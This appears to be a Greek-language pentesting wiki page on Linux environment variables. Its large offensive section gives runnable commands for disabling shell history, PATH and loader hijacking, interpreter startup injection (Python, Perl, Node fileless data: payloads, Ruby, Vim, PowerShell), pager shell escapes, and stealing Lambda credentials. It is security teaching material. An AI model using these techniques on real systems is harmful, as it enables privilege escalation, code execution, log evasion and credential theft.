# Μεταβλητές περιβάλλοντος Linux

{{#include ../../banners/hacktricks-training.md}}

## Καθολικές μεταβλητές

Οι καθολικές μεταβλητές **θα** κληρονομηθούν από **διεργασίες-παιδιά**.

Μπορείτε να δημιουργήσετε μια καθολική μεταβλητή για την τρέχουσα συνεδρία σας ως εξής:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Αυτή η μεταβλητή θα είναι προσβάσιμη από τις τρέχουσες συνεδρίες σας και τις θυγατρικές διεργασίες τους.

Μπορείτε να **αφαιρέσετε** μια μεταβλητή εκτελώντας:

```bash
unset MYGLOBAL
```

## Τοπικές μεταβλητές

Οι **τοπικές μεταβλητές** μπορούν να **προσπελαστούν** μόνο από το **τρέχον shell/script**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Λίστα τρεχουσών μεταβλητών

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Τα περιεχόμενα του `/proc/*/environ` είναι **διαχωρισμένα με NUL**, επομένως αυτές οι παραλλαγές συνήθως διαβάζονται ευκολότερα:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Αν αναζητάτε **credentials** ή **ενδιαφέρουσες ρυθμίσεις υπηρεσιών** σε κληρονομημένα environments, ελέγξτε επίσης το [Linux Post Exploitation](../post-exploitation/README.md).

## Συνήθεις μεταβλητές

Από: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – η οθόνη που χρησιμοποιείται από το **X**. Συνήθως, αυτή η μεταβλητή ορίζεται σε **:0.0**, που σημαίνει την πρώτη οθόνη του τρέχοντος υπολογιστή.
- **EDITOR** – ο προτιμώμενος επεξεργαστής κειμένου του χρήστη.
- **HISTFILESIZE** – ο μέγιστος αριθμός γραμμών που περιέχει το αρχείο ιστορικού.
- **HISTSIZE** – ο αριθμός γραμμών που προστίθενται στο αρχείο ιστορικού όταν ο χρήστης ολοκληρώνει τη συνεδρία του
- **HOME** – ο προσωπικός σας κατάλογος.
- **HOSTNAME** – το hostname του υπολογιστή.
- **LANG** – η τρέχουσα γλώσσα σας.
- **MAIL** – η τοποθεσία του αρχείου αλληλογραφίας του χρήστη. Συνήθως **/var/spool/mail/USER**.
- **MANPATH** – η λίστα καταλόγων στους οποίους γίνεται αναζήτηση για σελίδες εγχειριδίου.
- **OSTYPE** – ο τύπος του λειτουργικού συστήματος.
- **PS1** – η προεπιλεγμένη προτροπή στο bash.
- **PATH** – αποθηκεύει τις διαδρομές όλων των καταλόγων που περιέχουν εκτελέσιμα αρχεία, ώστε να μπορείτε να εκτελείτε ένα αρχείο καθορίζοντας μόνο το όνομά του και όχι τη σχετική ή απόλυτη διαδρομή.
- **PWD** – ο τρέχων κατάλογος εργασίας.
- **SHELL** – η διαδρομή προς το τρέχον command shell (για παράδειγμα, **/bin/bash**).
- **TERM** – ο τρέχων τύπος τερματικού (για παράδειγμα, **xterm**).
- **TZ** – η ζώνη ώρας σας.
- **USER** – το τρέχον όνομα χρήστη σας.

## Ενδιαφέρουσες μεταβλητές για hacking

Δεν είναι όλες οι μεταβλητές εξίσου χρήσιμες. Από επιθετική σκοπιά, δώστε προτεραιότητα στις μεταβλητές που αλλάζουν τις **διαδρομές αναζήτησης**, τα **αρχεία εκκίνησης**, τη **συμπεριφορά του dynamic linker** ή τον **έλεγχο και την καταγραφή συμβάντων**.

### **HISTFILESIZE**

**Αλλάξτε την τιμή αυτής της μεταβλητής σε 0**, ώστε όταν **ολοκληρώσετε τη συνεδρία σας**, το **αρχείο ιστορικού** (\~/.bash_history) να **περικοπεί στις 0 γραμμές**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Αλλάξτε **την τιμή αυτής της μεταβλητής σε 0**, ώστε οι εντολές **να μην αποθηκεύονται στο ιστορικό της μνήμης** και να μην εγγράφονται ξανά στο **αρχείο ιστορικού** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Αν **η τιμή αυτής της μεταβλητής έχει οριστεί σε `ignorespace` ή `ignoreboth`**, οποιαδήποτε εντολή έχει μπροστά της ένα επιπλέον κενό δεν θα αποθηκευτεί στο ιστορικό.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Ορίστε το **history file** σε **`/dev/null`** ή καταργήστε το εντελώς. Αυτό είναι συνήθως πιο αξιόπιστο από το να αλλάξετε μόνο το μέγεθος του ιστορικού.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Οι διεργασίες θα χρησιμοποιούν το **proxy** που δηλώνεται εδώ για να συνδεθούν στο διαδίκτυο μέσω **http ή https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: προεπιλεγμένος proxy για εργαλεία/πρωτόκολλα που τον υποστηρίζουν.
- `no_proxy`: λίστα εξαιρέσεων (hosts/domains/CIDRs) που πρέπει να συνδέονται απευθείας.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Μπορούν να χρησιμοποιηθούν τόσο πεζές όσο και κεφαλαίες παραλλαγές, ανάλογα με το εργαλείο (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Οι διεργασίες θα εμπιστεύονται τα πιστοποιητικά που υποδεικνύονται σε **αυτές τις env variables**. Αυτό είναι χρήσιμο για να κάνετε εργαλεία όπως τα **`curl`**, **`git`**, οι HTTP clients της Python ή οι package managers να εμπιστεύονται μια CA που ελέγχεται από τον attacker (για παράδειγμα, για να φαίνεται νόμιμο ένα interception proxy).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Αν ένας προνομιούχος wrapper/script εκτελεί εντολές **χωρίς απόλυτα paths**, υπερισχύει ο **πρώτος κατάλογος που ελέγχεται από τον attacker** στο `PATH`. Αυτό είναι το primitive πίσω από πολλά **PATH hijacks** σε `sudo`, cron jobs, shell wrappers και προσαρμοσμένα SUID helpers. Αναζητήστε `env_keep+=PATH`, αδύναμο `secure_path` ή wrappers που καλούν τα `tar`, `service`, `cp`, `python` κ.λπ. με το όνομά τους.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Για πλήρεις αλυσίδες privilege-escalation που εκμεταλλεύονται το `PATH`, δείτε το [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

Το `HOME` δεν είναι απλώς αναφορά σε έναν κατάλογο: πολλά εργαλεία φορτώνουν αυτόματα **dotfiles**, **plugins** και **ρυθμίσεις ανά χρήστη** από το `$HOME` ή το `$XDG_CONFIG_HOME`. Αν μια ροή εργασιών με αυξημένα προνόμια διατηρεί αυτές τις τιμές, το **config injection** μπορεί να είναι ευκολότερο από το binary hijacking.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Ενδιαφέροντες στόχοι περιλαμβάνουν τα `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` και αρχεία ειδικά για εργαλεία, όπως το `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Αυτές οι μεταβλητές επηρεάζουν τον **dynamic linker**:

- `LD_PRELOAD`: επιβάλλει την προηγούμενη φόρτωση επιπλέον shared objects.
- `LD_LIBRARY_PATH`: προσθέτει στην αρχή καταλόγους αναζήτησης βιβλιοθηκών.
- `LD_AUDIT`: φορτώνει βιβλιοθήκες auditor που παρακολουθούν τη φόρτωση βιβλιοθηκών και την επίλυση συμβόλων.

Είναι εξαιρετικά πολύτιμες για **hooking**, **instrumentation** και **privilege escalation**, αν μια προνομιούχα εντολή τις διατηρεί. Σε λειτουργία **secure-execution** (`AT_SECURE`, π.χ. setuid/setgid/capabilities), ο loader αφαιρεί ή περιορίζει πολλές από αυτές τις μεταβλητές. Ωστόσο, σφάλματα parser σε αυτό το πρώιμο στάδιο του loader εξακολουθούν να έχουν σοβαρό αντίκτυπο, επειδή εκτελούνται **πριν από** το πρόγραμμα-στόχο.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

Το `GLIBC_TUNABLES` αλλάζει τη συμπεριφορά της glibc στα αρχικά στάδια (για παράδειγμα, τις ρυθμίσεις του allocator) και είναι πολύ χρήσιμο σε exploit labs. Έχει επίσης σημασία από πλευράς ασφάλειας, επειδή ο **dynamic loader το αναλύει πολύ νωρίς**. Το bug **Looney Tunables** του 2023 υπενθύμισε ότι μία και μόνο μεταβλητή περιβάλλοντος που αναλύεται από τον loader μπορεί να αποτελέσει **primitive τοπικής κλιμάκωσης προνομίων** απέναντι σε προγράμματα SUID.<sup>[[6]](#references)</sup>

Για το CVE-2023-4911, συγκρίνετε την **έκδοση του πακέτου της διανομής που είναι εγκατεστημένη** με τη διορθωμένη έκδοση του προμηθευτή και επαληθεύστε ποιος loader χρησιμοποιείται πράγματι για τις νέες διεργασίες. Μια συμβολοσειρά έκδοσης upstream από μόνη της δεν είναι αξιόπιστη: το Debian έκανε backport τον ευάλωτο parser στο πακέτο του 2.31, ενώ άλλες διανομές έκαναν backport τις διορθώσεις χωρίς να αλλάξουν τον αριθμό της έκδοσης upstream. Για να πραγματοποιηθεί στην πράξη μετάβαση προνομίων, χρειάζεται επίσης ένας εκτελέσιμος προνομιούχος στόχος του οποίου η αλλαγή ταυτότητας δεν εμποδίζεται από το `NoNewPrivs`, ένα mount `nosuid` ή κάποιο άλλο μέτρο μετριασμού. Αποφύγετε την εκτέλεση probe που προκαλεί crash με malformed `GLIBC_TUNABLES` κατά την παθητική απαρίθμηση. Δείτε τον [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), τον [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) και τη [συμβουλευτική ανακοίνωση της Red Hat](https://access.redhat.com/security/cve/cve-2023-4911) για το αν εφαρμόζεται σε κάθε έκδοση· η [ειδοποίηση ασφαλείας](https://ubuntu.com/security/notices/USN-6409-1) του Ubuntu αναφέρει επίσης ότι απαιτείται επανεκκίνηση μετά την ενημέρωση.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Αν το **Bash** ξεκινήσει **μη διαδραστικά**, ελέγχει το `BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το script-στόχο. Όταν το Bash καλείται ως `sh` ή σε διαδραστική λειτουργία τύπου POSIX, μπορεί επίσης να ελεγχθεί το `ENV`. Αυτός είναι ένας κλασικός τρόπος να μετατραπεί ένα shell wrapper σε εκτέλεση κώδικα, αν το περιβάλλον ελέγχεται από attacker.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Το Bash αγνοεί αυτά τα αρχεία εκκίνησης όταν τα **real/effective IDs διαφέρουν**· το `-p` διατηρεί το effective ID, αλλά δεν ενεργοποιεί αυτά τα αρχεία εκκίνησης, οπότε η ακριβής συμπεριφορά εξαρτάται από τον τρόπο με τον οποίο το wrapper καλεί το shell. Να είστε προσεκτικοί με προνομιούχα wrappers που καλούν `setuid()`/`setgid()` **πριν** από την εκκίνηση του Bash: όταν τα IDs γίνουν ξανά ίδια, το Bash μπορεί να εμπιστευτεί τα `BASH_ENV`, `ENV` και τη σχετική κατάσταση του shell, τα οποία διαφορετικά θα αγνοούσε.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Όταν το Bash εκτελείται με ενεργοποιημένο το **xtrace**, επεκτείνει το `PS4` και το εμφανίζει πριν από κάθε εντολή που ανιχνεύεται. Το `PS4` επεκτείνεται όπως ένα prompt, επομένως εκτελείται κάθε **command substitution** που περιέχει. Το κρίσιμο είναι ότι το xtrace μπορεί να ενεργοποιηθεί αποκλειστικά μέσω του environment με εξαγωγή του `SHELLOPTS=xtrace` — δεν απαιτείται `-x` στη γραμμή εντολών — οπότε οποιοδήποτε Bash script εκτελεί το θύμα γίνεται μέσο εκτέλεσης κώδικα.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` δεν κάνει τίποτα μέχρι να ενεργοποιηθεί το xtrace (`SHELLOPTS=xtrace`, `set -x` ή `bash -x`), και το Bash απορρίπτει το `SHELLOPTS` σε περιβάλλοντα privileged/setuid, όπως και το `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Αυτές οι μεταβλητές αλλάζουν τον τρόπο με τον οποίο ξεκινά η Python:

- `PYTHONPATH`: προσθέτει διαδρομές αναζήτησης εισαγωγών στην αρχή.
- `PYTHONHOME`: μεταφέρει τη θέση του δέντρου της standard library.
- `PYTHONSTARTUP`: εκτελεί ένα αρχείο πριν από την interactive προτροπή.
- `PYTHONINSPECT=1`: μεταβαίνει σε interactive mode μετά την ολοκλήρωση ενός script.
- `PYTHONBREAKPOINT`: το `package.module.callable` καλείται (και το module του εισάγεται) όταν ο κώδικας φτάσει στο `breakpoint()`.<sup>[[8]](#references)</sup>

Είναι χρήσιμες ενάντια σε scripts συντήρησης, debuggers, shells και wrappers που καλούν την Python με ελεγχόμενο περιβάλλον. Τα `python -E` και `python -I` αγνοούν όλες τις μεταβλητές `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Ένα πρόσφατο παράδειγμα από τον πραγματικό κόσμο ήταν το LPE του 2024 στο **needrestart** σε συστήματα Ubuntu/Debian: ο scanner που ανήκε στον root αντέγραψε το `PYTHONPATH` μιας μη προνομιούχας διεργασίας από το `/proc/<PID>/environ` και στη συνέχεια εκτέλεσε Python. Το δημοσιευμένο exploit τοποθέτησε το `importlib/__init__.so` στη διαδρομή που ελεγχόταν από τον επιτιθέμενο, ώστε η Python να εκτελέσει κώδικα του επιτιθέμενου κατά την αρχικοποίησή της, πριν καν έχει σημασία το hard-coded script του helper.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Η Perl έχει εξίσου χρήσιμες μεταβλητές εκκίνησης:

- `PERL5LIB`: προσθέτει καταλόγους βιβλιοθηκών στην αρχή της λίστας.
- `PERL5OPT`: εισάγει switches σαν να βρίσκονταν στη γραμμή εντολών κάθε `perl`.

Αυτό μπορεί να επιβάλει **αυτόματη φόρτωση modules** ή να αλλάξει τη συμπεριφορά του interpreter προτού το script-στόχος κάνει οτιδήποτε ενδιαφέρον. Η Perl αγνοεί αυτές τις μεταβλητές σε περιβάλλοντα **taint / setuid / setgid**, αλλά εξακολουθούν να έχουν μεγάλη σημασία για wrappers που εκτελούνται κανονικά ως root, εργασίες CI, installers και προσαρμοσμένους κανόνες sudoers.

Αν ένας κανόνας sudo επιτρέπει παρακάμψεις περιβάλλοντος και η προνομιούχα εντολή εκκινεί τελικά Perl, ελέγξτε επίσης το `PERL5DB`. Η τεκμηρίωση της Perl αναφέρει ότι το `PERL5OPT=-d` εκκινεί τον debugger και ότι το `PERL5DB` παρέχει κώδικα αρχικοποίησης του debugger όταν η Perl ξεκινά με ένα σκέτο switch `-d`. Η αφαίρεση μόνο των `PERL5LIB` και `PERLLIB` δεν εξαλείφει αυτή τη διαδρομή. Οι μεταβλητές πρέπει να διατηρηθούν από το sudo και το wrapper, ενώ η διεργασία Perl δεν πρέπει να τις αγνοεί λόγω χειρισμού taint ή set-ID· εξετάστε τον ακριβή κανόνα και την αλυσίδα εκτέλεσης χωρίς να εκτελέσετε τον προνομιούχο helper κατά την απαρίθμηση. Δείτε την [αναφορά μεταβλητών περιβάλλοντος του perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Η ενσωματωμένη διαδρομή αναζήτησης [`@INC` της Perl](https://perldoc.perl.org/perlvar#@INC) αποτελεί ένα ακόμη όριο εμπιστοσύνης για modules, ακόμη και χωρίς μεταβλητές περιβάλλοντος που διατηρούνται. Για μια προνομιούχα διεργασία Perl, συσχετίστε μια πραγματική δήλωση `use` ή `require` με το όνομα του module που επιλύεται, τη σειρά αναζήτησης και τη δυνατότητα ενός χρήστη με χαμηλότερα προνόμια να δημιουργήσει ή να αντικαταστήσει αυτό το module σε έναν κατάλογο που αναζητείται. Ένας εγγράψιμος κατάλογος βιβλιοθηκών από μόνος του δεν αποδεικνύει ότι η προνομιούχα διεργασία θα φορτώσει κώδικα από αυτόν.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

Το `NODE_OPTIONS` προσθέτει **Node.js CLI flags** σε κάθε διεργασία `node` που κληρονομεί το περιβάλλον. Αυτό το καθιστά χρήσιμο κατά wrappers, εργασίες CI, βοηθητικές διεργασίες του Electron και κανόνες sudo που τελικά εκτελούν Node. Τα πιο ενδιαφέροντα flags από επιθετική σκοπιά είναι συνήθως:

- `--require <file>`: φορτώνει εκ των προτέρων ένα αρχείο CommonJS πριν από το script-στόχο.
- `--import <module>`: φορτώνει εκ των προτέρων ένα ES module πριν από το script-στόχο.

Το Node απορρίπτει ορισμένα επικίνδυνα flags στο `NODE_OPTIONS`, αλλά τα `--require` και `--import` επιτρέπονται ρητά και υποβάλλονται σε επεξεργασία **πριν** από τα κανονικά ορίσματα της γραμμής εντολών.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Προφόρτωση χωρίς αρχείο με URL `data:`

Όταν μπορείτε να ορίσετε το `NODE_OPTIONS`, αλλά **δεν μπορείτε να γράψετε αρχείο** στον στόχο (σύστημα αρχείων μόνο για ανάγνωση, περιορισμένο API, serverless runtime κ.λπ.), το `--import` δέχεται URL `data:text/javascript,`, οπότε ολόκληρο το payload μεταφέρεται μέσα στην ίδια τη μεταβλητή περιβάλλοντος. Το JavaScript πρέπει να είναι **πλήρως κωδικοποιημένο σε URL** — το Node αναλύει την τιμή ως URL, οπότε οποιοδήποτε μη κωδικοποιημένο κενό (ή άλλος χαρακτήρας) αποκόπτει το payload και προκαλεί `SyntaxError`. Αυτό λειτουργεί στο Node 20.6+, όπου το `--import` βρίσκεται στη λίστα επιτρεπόμενων επιλογών του `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Αυτός είναι ένας συνηθισμένος τρόπος να μετατραπεί ο έλεγχος του `NODE_OPTIONS` σε RCE σε **managed cloud runtimes** των οποίων οι functions εκτελούν Node. Για παράδειγμα, ένας attacker που μπορεί μόνο να αλλάξει τη διαμόρφωση ενός Lambda (`lambda:UpdateFunctionConfiguration`, χωρίς `iam:PassRole` ή ενημέρωση κώδικα) μπορεί να εισαγάγει `NODE_OPTIONS=--import data:text/javascript,<payload>` για να εκτελέσει κώδικα μέσα στη function και να κλέψει τα διαπιστευτήρια του execution role της. Το εισαγόμενο module εκτελείται **πριν** από τον handler, ο οποίος στη συνέχεια συνεχίζει να εκτελείται κανονικά.

Για remote gadget chains που ορίζουν έμμεσα το `NODE_OPTIONS` (για παράδειγμα, prototype-pollution προς RCE), δείτε [αυτή την άλλη σελίδα](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Η Ruby προσφέρει την ίδια κατηγορία startup abuse:

- `RUBYLIB`: προσθέτει καταλόγους στην αρχή του load path της Ruby.
- `RUBYOPT`: εισάγει επιλογές γραμμής εντολών όπως το `-r` σε κάθε invocation του `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Οι ευπάθειες του **needrestart** το 2024 έδειξαν ότι αυτό δεν είναι απλώς ένα τέχνασμα για lab: το ίδιο helper με δικαιώματα root που ήταν ευάλωτο σε κατάχρηση του `PYTHONPATH` μπορούσε επίσης να εξαναγκαστεί να εκτελέσει Ruby με `RUBYLIB` που ελεγχόταν από attacker, φορτώνοντας το `enc/encdb.so` από έναν κατάλογο του attacker.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Το Vim/Neovim εκτελεί τις εντολές Ex που περιέχονται στο `VIMINIT` (ή στο εφεδρικό `EXINIT`) κατά την κανονική εκκίνηση. Οι εντολές Ex περιλαμβάνουν τις `:!cmd` και `:call system(...)`, οπότε ο έλεγχος της μεταβλητής επιτρέπει την εκτέλεση κώδικα κάθε φορά που ένα θύμα ανοίγει το Vim (ένα `sudo vim` ως root, `crontab -e`, `visudo`, το `$EDITOR` που εκκινείται από τα `git`/`less` κ.λπ.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Η λειτουργία batch (`vim -es`/`-Es`) παραλείπει αυτές τις μεταβλητές, αλλά κατά την κανονική διαδραστική εκκίνηση εκτελούνται.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

Το PowerShell Core (`pwsh`) εκτελείται σε Linux/macOS (και Windows) και είναι **.NET application**, επομένως αρκετές μεταβλητές περιβάλλοντος μετατρέπουν κάθε invocation του `pwsh` με κληρονομημένο περιβάλλον σε code execution — χρήσιμο ενάντια σε cron/systemd jobs, CI runners και προνομιούχα wrappers που εκτελούν το `pwsh` μέσω shell.

- `PSModulePath`: Το PowerShell αναζητά αναδρομικά σε κάθε κατάλογο αυτής της λίστας για modules `.psd1`/`.psm1` και κάνει **auto-load** ενός module την πρώτη φορά που γίνεται αναφορά σε κάποια εντολή που εξάγει. Προσθέστε έναν κατάλογο στην αρχή της λίστας και ο κώδικας ανώτατου επιπέδου του module σας εκτελείται κατά την εισαγωγή· επειδή η επίλυση ακολουθεί τη σειρά *Alias → Function → Cmdlet*, μια εξαγόμενη function μπορεί ακόμη και να επισκιάσει ένα ενσωματωμένο cmdlet που καλεί το θύμα.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: Μεταφέρει το `powershell/Microsoft.PowerShell_profile.ps1`, το οποίο εκτελείται κατά την εκκίνηση (εκτός αν χρησιμοποιηθεί το `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: managed assembly του οποίου το `StartupHook.Initialize()` εκτελείται πριν από το `Main` (κοινό για κάθε .NET app).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: το CLR profiling API φορτώνει μια βιβλιοθήκη του επιτιθέμενου στη διεργασία κατά την εκκίνηση (οι μεταβλητές path υπερισχύουν του registry· το `DOTNET_*` είναι το νεότερο alias). Στο Windows PowerShell 5.1 (.NET Framework), χρησιμοποιήστε `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>**

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Στα Windows, το `PSExecutionPolicyPreference=Bypass` καταργεί επιπλέον την προστασία «blocked unsigned scripts», ώστε ένα τοποθετημένο profile/module να εκτελεστεί πράγματι. Δείτε την ειδική σελίδα για πλήρη PoCs:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Ορισμένα εργαλεία δεν διαβάζουν απλώς μια διαδρομή από το περιβάλλον· περνούν την τιμή σε ένα **shell**, έναν **editor** ή έναν **input preprocessor**. Έτσι, οι παρακάτω μεταβλητές παρουσιάζουν ιδιαίτερο ενδιαφέρον όταν ένα προνομιούχο wrapper εκτελεί `git`, `man`, `less` ή παρόμοια εργαλεία προβολής κειμένου:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: επιλέγουν την εντολή pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: επιλέγουν την εντολή editor, συχνά μαζί με ορίσματα.
- `LESSOPEN`, `LESSCLOSE`: ορίζουν pre/post-processors που εκτελούνται όταν το `less` ανοίγει ένα αρχείο.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Το Git υποστηρίζει επίσης έγχυση ρυθμίσεων μόνο μέσω μεταβλητών περιβάλλοντος, χωρίς εγγραφή στον δίσκο, μέσω των `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` και `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Από την οπτική του post-exploitation, να θυμάστε επίσης ότι τα κληρονομημένα περιβάλλοντα συχνά περιέχουν **διαπιστευτήρια**, **ρυθμίσεις proxy**, **service tokens** ή **cloud keys**. Δείτε το [Linux Post Exploitation](../post-exploitation/README.md) για αναζήτηση των `/proc/<PID>/environ` και `systemd` `Environment=`.

### PS1

Αλλάξτε την εμφάνιση του prompt.

[**Αυτό είναι ένα παράδειγμα**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Αυτό είναι ένα παράδειγμα](<../images/image (897).png>)

Κανονικός χρήστης:

![PERL5OPT & PERL5LIB - PS1: Μία, δύο και τρεις εργασίες στο παρασκήνιο](<../images/image (740).png>)

Μία, δύο και τρεις εργασίες στο παρασκήνιο:

![PERL5OPT & PERL5LIB - PS1: Μία, δύο και τρεις εργασίες στο παρασκήνιο](<../images/image (145).png>)

Μία εργασία στο παρασκήνιο, μία σε αναστολή και η τελευταία εντολή δεν ολοκληρώθηκε σωστά:

![PERL5OPT & PERL5LIB - PS1: Μία εργασία στο παρασκήνιο, μία σε αναστολή και η τελευταία εντολή δεν ολοκληρώθηκε σωστά](<../images/image (715).png>)

## References

- [1] [Εγχειρίδιο GNU Bash - Αρχεία εκκίνησης Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs στο needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Τεκμηρίωση CLI του Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Συνήθεις μεταβλητές περιβάλλοντος - Geek University](https://geek-university.com/linux/common-environment-variables/)
